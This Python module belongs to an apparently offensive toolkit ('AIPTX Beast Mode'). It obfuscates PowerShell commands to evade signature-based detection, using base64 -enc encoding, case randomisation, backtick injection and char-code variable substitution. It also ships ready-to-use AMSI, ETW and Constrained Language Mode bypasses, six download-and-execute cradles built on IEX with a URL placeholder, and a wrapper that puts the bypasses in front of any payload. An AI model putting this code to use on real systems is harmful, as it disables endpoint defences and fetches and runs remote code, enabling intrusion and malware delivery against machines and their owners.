"""
AIPTX Beast Mode - PowerShell Obfuscation
=========================================

PowerShell command and script obfuscation techniques.
"""

from __future__ import annotations

import base64
import logging
import random
import string
from typing import Any

logger = logging.getLogger(__name__)


class PowerShellObfuscator:
    """
    PowerShell obfuscation engine.

    Provides multiple obfuscation techniques for evading
    detection and signature-based security tools.
    """

    def __init__(self):
        """Initialize PowerShell obfuscator."""
        self._techniques = [
            "base64",
            "concat",
            "case_randomize",
            "variable_substitution",
            "tick_injection",
            "string_reorder",
        ]

    def obfuscate(
        self,
        command: str,
        techniques: list[str] | None = None,
        level: int = 1,
    ) -> str:
        """
        Obfuscate PowerShell command.

        Args:
            command: Original command
            techniques: Techniques to apply
            level: Obfuscation level (1-3)

        Returns:
            Obfuscated command
        """
        if techniques is None:
            techniques = self._techniques[:level * 2]

        result = command

        for technique in techniques:
            if technique == "base64":
                result = self.base64_encode(result)
            elif technique == "concat":
                result = self.concat_strings(result)
            elif technique == "case_randomize":
                result = self.randomize_case(result)
            elif technique == "variable_substitution":
                result = self.variable_substitute(result)
            elif technique == "tick_injection":
                result = self.inject_ticks(result)

        return result

    def base64_encode(self, command: str) -> str:
        """
        Encode command as Base64.

        Args:
            command: Command to encode

        Returns:
            PowerShell -EncodedCommand format
        """
        # PowerShell expects UTF-16LE encoding
        encoded = base64.b64encode(command.encode("utf-16-le")).decode()
        return f"powershell -enc {encoded}"

    def concat_strings(self, command: str) -> str:
        """
        Break strings into concatenated parts.

        Args:
            command: Command to obfuscate

        Returns:
            Command with concatenated strings
        """
        # Find quoted strings and break them up
        result = []
        i = 0
        while i < len(command):
            if command[i] in ('"', "'"):
                quote = command[i]
                # Find end of string
                end = command.find(quote, i + 1)
                if end != -1:
                    original = command[i+1:end]
                    if len(original) > 3:
                        # Break into parts
                        parts = []
                        for j in range(0, len(original), 3):
                            parts.append(f"'{original[j:j+3]}'")
                        result.append("(" + "+".join(parts) + ")")
                    else:
                        result.append(command[i:end+1])
                    i = end + 1
                else:
                    result.append(command[i])
                    i += 1
            else:
                result.append(command[i])
                i += 1

        return "".join(result)

    def randomize_case(self, command: str) -> str:
        """
        Randomize case of command keywords.

        Args:
            command: Command to obfuscate

        Returns:
            Case-randomized command
        """
        # PowerShell is case-insensitive
        keywords = [
            "powershell", "invoke", "expression", "iex", "new-object",
            "webclient", "downloadstring", "downloadfile", "system",
            "net", "reflection", "assembly", "load", "type", "method",
        ]

        result = command
        for keyword in keywords:
            if keyword in result.lower():
                randomized = "".join(
                    c.upper() if random.random() > 0.5 else c.lower()
                    for c in keyword
                )
                result = result.replace(keyword, randomized)
                result = result.replace(keyword.title(), randomized)

        return result

    def variable_substitute(self, command: str) -> str:
        """
        Substitute strings with variable references.

        Args:
            command: Command to obfuscate

        Returns:
            Command with variable substitutions
        """
        # Common substitutions
        substitutions = {
            "powershell": "$pS",
            "Invoke-Expression": "$iEx",
            "New-Object": "$nO",
            "Net.WebClient": "$wC",
            "DownloadString": "$dS",
            "System.Reflection.Assembly": "$aS",
        }

        # Build variable declarations
        declarations = []
        result = command

        for original, var in substitutions.items():
            if original.lower() in result.lower():
                # Build obfuscated variable assignment
                parts = []
                for c in original:
                    if random.random() > 0.5:
                        parts.append(f"[char]{ord(c)}")
                    else:
                        parts.append(f"'{c}'")
                assignment = f"{var}=(-join({','.join(parts)}))"
                declarations.append(assignment)
                result = result.replace(original, f"${{{var.strip('$')}}}")

        if declarations:
            result = ";".join(declarations) + ";" + result

        return result

    def inject_ticks(self, command: str) -> str:
        """
        Inject backticks to break up keywords.

        Args:
            command: Command to obfuscate

        Returns:
            Command with injected ticks
        """
        # Backtick is escape character in PowerShell, ignored within keywords
        keywords = [
            "Invoke", "Expression", "Object", "WebClient",
            "Download", "String", "System", "Reflection",
        ]

        result = command
        for keyword in keywords:
            if keyword in result:
                # Inject ticks at random positions
                ticked = ""
                for i, c in enumerate(keyword):
                    if i > 0 and i < len(keyword) - 1 and random.random() > 0.7:
                        ticked += "`"
                    ticked += c
                result = result.replace(keyword, ticked)

        return result

    def get_amsi_bypass(self, variant: int = 1) -> str:
        """
        Get AMSI bypass technique.

        Args:
            variant: Bypass variant number

        Returns:
            AMSI bypass command
        """
        bypasses = [
            # Reflection-based
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            # Matt Graeber's bypass
            "[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession','NonPublic,Static').GetValue($null),0)",
            # Force error
            "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf=@(0);[Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)",
        ]
        return bypasses[(variant - 1) % len(bypasses)]

    def get_etw_bypass(self) -> str:
        """Get ETW tracing bypass."""
        return """[Reflection.Assembly]::LoadWithPartialName('System.Core').GetType('System.Diagnostics.Eventing.EventProvider').GetField('m_enabled','NonPublic,Instance').SetValue([Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').GetValue($null),0)"""

    def get_constrained_language_bypass(self) -> str:
        """Get Constrained Language Mode bypass."""
        return """$ExecutionContext.SessionState.LanguageMode = "FullLanguage" """

    def get_download_cradles(self) -> list[dict[str, str]]:
        """
        Get various download cradle variations.

        Returns:
            List of download cradle techniques
        """
        return [
            {
                "name": "webclient",
                "command": "IEX(New-Object Net.WebClient).DownloadString('<url>')",
                "detection_risk": "high",
            },
            {
                "name": "webclient_proxy",
                "command": "$w=New-Object Net.WebClient;$w.Proxy=[Net.WebRequest]::GetSystemWebProxy();$w.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $w.DownloadString('<url>')",
                "detection_risk": "medium",
            },
            {
                "name": "invoke_webrequest",
                "command": "IEX(Invoke-WebRequest -Uri '<url>' -UseBasicParsing).Content",
                "detection_risk": "high",
            },
            {
                "name": "httpwebrequest",
                "command": "$r=[Net.HttpWebRequest]::Create('<url>');$r.Method='GET';$s=new-object IO.StreamReader($r.GetResponse().GetResponseStream());IEX $s.ReadToEnd()",
                "detection_risk": "medium",
            },
            {
                "name": "xml",
                "command": "(New-Object Xml.XmlDocument).Load('<url>')",
                "detection_risk": "low",
            },
            {
                "name": "com_object",
                "command": "$c=New-Object -ComObject MsXml2.ServerXmlHttp;$c.Open('GET','<url>',$false);$c.Send();IEX $c.ResponseText",
                "detection_risk": "low",
            },
        ]

    def create_payload_wrapper(
        self,
        payload: str,
        bypass_amsi: bool = True,
        bypass_etw: bool = False,
    ) -> str:
        """
        Wrap payload with bypasses.

        Args:
            payload: Main payload
            bypass_amsi: Include AMSI bypass
            bypass_etw: Include ETW bypass

        Returns:
            Wrapped payload
        """
        parts = []

        if bypass_amsi:
            parts.append(self.get_amsi_bypass())

        if bypass_etw:
            parts.append(self.get_etw_bypass())

        parts.append(payload)

        return ";".join(parts)


__all__ = ["PowerShellObfuscator"]
